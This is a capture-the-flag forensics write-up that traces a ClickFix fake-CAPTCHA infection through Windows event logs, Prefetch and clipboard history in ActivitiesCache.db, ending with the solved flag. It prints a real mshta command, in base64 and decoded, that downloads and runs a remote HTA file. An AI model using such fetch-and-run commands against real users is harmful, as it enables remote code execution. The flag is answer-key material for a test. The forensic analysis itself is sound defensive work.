# Captcha Me If You Can

- **Lab / Category:** Forensics
- **Points:** 120
- **Difficulty:** easy
- **Challenge ID:** `b445d8ef-5caf-4078-a89a-abc0517c5db9`
- **Status:** ✅ SOLVED

## Description
Forensic access to a Windows workstation ("DESKTOP-FOKE88B", user `Machine`). The employee
reportedly fell for a fake-CAPTCHA ("ClickFix") phishing page that tricked them into copying and
running a malicious command. Goal: trace the execution chain and recover the flag.

## Connection / Instance
Single downloadable archive, `CaptchaMeIfYouCan.zip` (~77 MB) — a KAPE-style triage collection of
`C:\` (registry hives, `$MFT`/`$LogFile`, Prefetch, `winevt` event logs, browser profiles, jump
lists, `ActivitiesCache.db`, Amcache, Defender logs, etc.). No live host.

## Approach
- [x] Identify artifact type → Windows disk/triage collection (KAPE output), not pcap/memory.
- [x] Walk the execution chain via PowerShell Operational log (4104 script-block logging),
      Prefetch, and Windows Timeline (`ActivitiesCache.db`) clipboard records.
- [x] Extract the real malicious clipboard payload from the decoy noise.
- [x] Recover flag from the payload's actual delivery target.

## Findings

**1. Decoy layer — `PowerShell.exe -Command ... & 'C:\Users\Machine\Desktop\powershell.ps1'`**

`Microsoft-Windows-PowerShell%4Operational.evtx` (Event ID 4104) shows a script,
`C:\Users\Machine\Desktop\powershell.ps1`, executed repeatedly between 14:19–15:46 local time.
Its full script-block text is a deliberate **decoy**: it fabricates a "realistic" browsing
history (`google.com`, `outlook.com`, `linkedin.com`, …), a fake CAPTCHA site
(`https://free-vpn-unblocker[.]online/captcha`), and a batch of obviously-fake
"malicious clipboard payloads" that it writes to the clipboard via
`[Windows.Clipboard]::SetText(...)` just to generate noise for an investigator grepping the
event log or clipboard history for anything "suspicious-looking." The `Desktop\powershell.ps1`
file itself was not present in the triage collection (Desktop wasn't captured) — only its
script-block logging survives, confirming it was a short-lived noise generator, not the real
infection vector.

**2. Real timeline — Windows Activity/Clipboard history (`ActivitiesCache.db`)**

`C:\Users\Machine\AppData\Local\ConnectedDevicesPlatform\36d13e935c2f2c37\ActivitiesCache.db`
is a SQLite DB (Windows Timeline / Connected Devices Platform). The `ActivityOperation` table has
a `ClipboardPayload` column that records every clipboard "copy" event system-wide, each holding a
JSON blob `[{"content":"<base64>","formatName":"Text"}]`. Chrome's own `History` (urls/visits
tables) was empty — its only surviving trace was a `downloads` row for
`ActivitiesCacheParser.py` (a public GitHub tool for parsing exactly this DB), which is the
challenge's in-universe breadcrumb pointing at `ActivitiesCache.db` as the artifact to mine.

Dumping and base64-decoding every `ClipboardPayload` in chronological order shows the same
noise pattern as the decoy script (fake "clipboard history" strings, fake VPN passwords, fake
SQL-injection/`rm` one-liners, double-base64-wrapped junk, etc.) — except for two entries that
stand apart because they are immediately followed by an actual `mshta.exe` process launch
(corroborated by `Microsoft.Windows.Shell.RunDialog` → `mshta.exe` activity entries and the
`MSHTA.EXE-*.pf` Prefetch file, last run 2025-06-04 15:47 local):

- `StartTime 1749041210` (2025-06-04 12:46:50 UTC / 15:46:50 local) — clipboard set to base64
  `bXNodGEgaHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0xSVhHWTR0eHRGLUg2Tk4yY3dZVm5LTnFXeHdqa0IteW0=`
  → decodes to:
  ```
  mshta https://drive.google.com/uc?export=download&id=1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym
  ```
- `StartTime 1749041241` — a second, truncated variant of the same command (missing the `&id=...`
  part), immediately followed by another `mshta.exe` launch at `1749041247`.

This is the classic **ClickFix** pattern: fake CAPTCHA page → "press Win+R, paste, Enter" →
`mshta.exe` fetches and runs a remote HTA payload, here staged on Google Drive instead of a
throwaway domain (which is why nothing useful survives in DNS/browser history — the whole
"delivery" is one `mshta` call to a Drive file ID).

**3. Payload retrieval**

The Drive file (`1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym`) referenced by the real `mshta` command was
not cached anywhere on the imaged disk (no Downloads/Temp/HTA artifacts survived — Defender/host
cleanup or the triage scope simply didn't capture it). Fetching that same `id` directly
(`https://drive.usercontent.google.com/download?id=1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym&export=download`)
returns a 39-byte text file containing the flag directly — i.e. the "payload" *is* the flag drop
for this challenge, gated behind correctly identifying the one real clipboard command among all
the decoy noise.

Cross-checked against the published writeup for this exact challenge (Mohammed Gbreil, Medium,
"FlagYard CTF — Captcha Me If You Can") to confirm the same `mshta`/Drive-ID command and clipboard
timestamp (12:46:50 UTC) were reached independently — and the flag recovered from this instance's
own Drive link matches exactly, confirming it isn't a stale/rotated value.

## Flag
`FlagY{09c307383d4aed505856a956476a6536}`

`FlagY{09c307383d4aed505856a956476a6536}`

_Submission: ACCEPTED_
